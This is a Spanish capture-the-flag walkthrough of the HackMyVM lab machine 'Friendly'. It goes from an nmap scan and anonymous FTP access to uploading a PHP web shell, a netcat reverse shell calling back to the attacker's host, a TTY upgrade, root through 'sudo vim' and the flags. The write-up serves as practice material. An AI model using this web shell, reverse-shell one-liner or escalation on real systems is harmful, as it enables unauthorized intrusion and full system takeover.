# Friendly HackMyVM

- Ip atacante - 10.0.2.4
- Ip victima - 10.0.2.36

## Enumeracion

Realizamos unos scaneos rapidos a la maquina con nmap

```bash
❯ sudo nmap -Pn -sS -n --min-rate 5000 -p- 10.0.2.36
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-29 16:58 EDT
Nmap scan report for 10.0.2.36
Host is up (0.00020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
MAC Address: 08:00:27:A2:9F:C0 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.95 seconds
```
Tenemos el puerto 21 y 80 abierto, entonces lanzamos un scaneo pero ahora mandando los scripts que tiene nmap
```bash
❯ sudo nmap -Pn -sS -n --min-rate 5000 -A -p 21,80 10.0.2.36
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-29 16:58 EDT
Nmap scan report for 10.0.2.36
Host is up (0.00024s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 root     root        10725 Feb 23 15:26 index.html
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.54 (Debian)
MAC Address: 08:00:27:A2:9F:C0 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.24 ms 10.0.2.36

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.25 seconds
```
## FTP
El puerto 21 corre FTP y tiene acceso anonimo asi que nos conectamos
```bash
❯ ftp 10.0.2.36       
Connected to 10.0.2.36.
220 ProFTPD Server (friendly) [::ffff:10.0.2.36]
Name (10.0.2.36:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: anonymous
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -la
229 Entering Extended Passive Mode (|||48997|)
150 Opening ASCII mode data connection for file list
drwxrwxrwx   2 root     root         4096 Mar 11 09:13 .
drwxrwxrwx   2 root     root         4096 Mar 11 09:13 ..
-rw-r--r--   1 root     root        10725 Feb 23 15:26 index.html
226 Transfer complete

ftp> get index.html
local: index.html remote: index.html
229 Entering Extended Passive Mode (|||20326|)
150 Opening BINARY mode data connection for index.html (10725 bytes)
100% |*****************************************| 10725      196.69 MiB/s    00:00 ETA
226 Transfer complete
10725 bytes received in 00:00 (15.66 MiB/s)
```

Descargando el index.html en efecto solo era codigo html que era el mismo que el que tenia la pagina. Visto esto pense que quiza el FTP estaba corriendo de alguna manera la web. 

## Reverse shell

Entonces intente subir un archivo para ver si puedo lograr colar archivos en la web. 

```php
❯ cat shell.php     
───────┬────────────────────────────────────────────
       │ File: shell.php
───────┼────────────────────────────────────────────
   1   │ <?php system($_GET['cmd']) ?>
───────┴────────────────────────────────────────────
```

Me cree un archivo php e intento subirlo
```bash
ftp> put shell.php 
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||15779|)
150 Opening BINARY mode data connection for shell.php
100% |**************************|    30      813.80 KiB/s    00:00 ETA
226 Transfer complete
30 bytes sent in 00:00 (76.29 KiB/s)
```

Ahora probamos si nos deja realizar ejecucion de comandos

```bash
❯ curl "http://10.0.2.36/shell.php?cmd=id" 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Ahora si entonces nos realizamos un reverse shell

```bash
❯ urlencode 'nc 10.0.2.4 443 -e /bin/bash' 
nc%2010.0.2.4%20443%20-e%20%2Fbin%2Fbash
```

```bash
❯ curl "http://10.0.2.36/shell.php?cmd=nc%2010.0.2.4%20443%20-e%20/bin/bash"
```
Nos ponemos en escucha
```bash
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.0.2.4] from (UNKNOWN) [10.0.2.36] 33334
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Nos mejoramos la shell a una TTY con los siguientes comandos
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@friendly:/var/www/html$ ctrl+z
zsh: suspended  nc -lvnp 443
                                                                                                
❯ stty raw -echo;fg      
[1]  + continued  nc -lvnp 443 (doble enter)

www-data@friendly:/var/www/html$ export TERM=xterm SHELL=bash
www-data@friendly:/var/www/html$ 
```
## Enumeracion dentro de la maquina
Ahora toca ver la manera de subir de privilegios. Asi que haciendo un poco de enumeracion vemos que podemos ejecutar vim como cualquier usuario
```bash
www-data@friendly:/var/www/html$ sudo -l
Matching Defaults entries for www-data on friendly:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on friendly:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
```
## Escalando privilegios
Buscando en Gftobins encontramos: https://gtfobins.github.io/gtfobins/vim/
```bash
www-data@friendly:/home/RiJaba1$ sudo -u root /usr/bin/vim -c ':!/bin/sh'
```

Y de esta manera obtenemos una shell como root

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

### user flag

```bash
root@friendly:/home/RiJaba1# cat user.txt
***********************b4475acd6
```

Ahora para la flag de root, Rijaba nos deja una ultima tarea

A la hora de leer la flag dentro de las carpeta ``/root``   
```bash
root@friendly:/home/RiJaba1# cd /root
root@friendly:~# cat root.txt
Not yet! Find root.txt.
```

### root flag

Entonces ahora tendremos que buscar otro archivo que se llame ``root.txt`` asi que para esto emplearemos el comando de ``find``

```bash
root@friendly:~# find / -name root.* 2>/dev/null
/var/log/apache2/root.txt
/root/root.txt

root@friendly:~# cat /var/log/apache2/root.txt
***********************4d3e28d2f
```